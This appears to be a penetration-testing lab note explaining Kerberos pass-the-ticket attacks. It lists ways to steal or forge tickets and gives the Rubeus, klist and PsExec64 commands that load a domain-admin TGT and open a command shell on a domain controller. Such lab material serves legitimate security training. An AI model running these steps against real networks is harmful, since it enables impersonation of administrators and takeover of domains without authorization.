### Pass-the-Ticket - Works with Kerberos Only
#### What is Pass-the-Ticket?
A **pass-the-ticket** attack is a post-exploitation technique where an ***attacker reuses stolen Kerberos tickets*** (`TGS` or `TGT`) to ***authenticate as a legitimate user without needing their password***. 

For **TGS** tickets, the attacker directly accesses services; with a **TGT** ticket, the attacker request a new service ticket from the authentication server.

#### Obtaining the Tickets
A couple of ways to obtain tickets are:
- Stealing them from memory from a compromised host
- Forging them with a Golder/Silver Ticket attack

#### Performing the attack
Once the ticket has been obtained, use ***Rubeus*** to perform ***pass-the-ticket*** attack. For this lab, `ticket.kirbi` has been provided.
- `ticket.kirbi:` is a TGT for the domain administrator.

**Load the ticket into memory**
```powershell
rubeus.exe ptt /ticket:ticket.kirbi
```

**Verify the ticket has been loaded**
```powershell
klist
```

**Once the ticket is loaded into memory, use `PsExec64` to connect to the DC**
```powershell
psexec64 \\dc01.ktown.local cmd
```
***Note: To force the usage of Kerberos, you must use hostnames when connecting to a service. Using IP addresses will make the authentication mechanism fall back to `NTLM` and the attack will fail.***

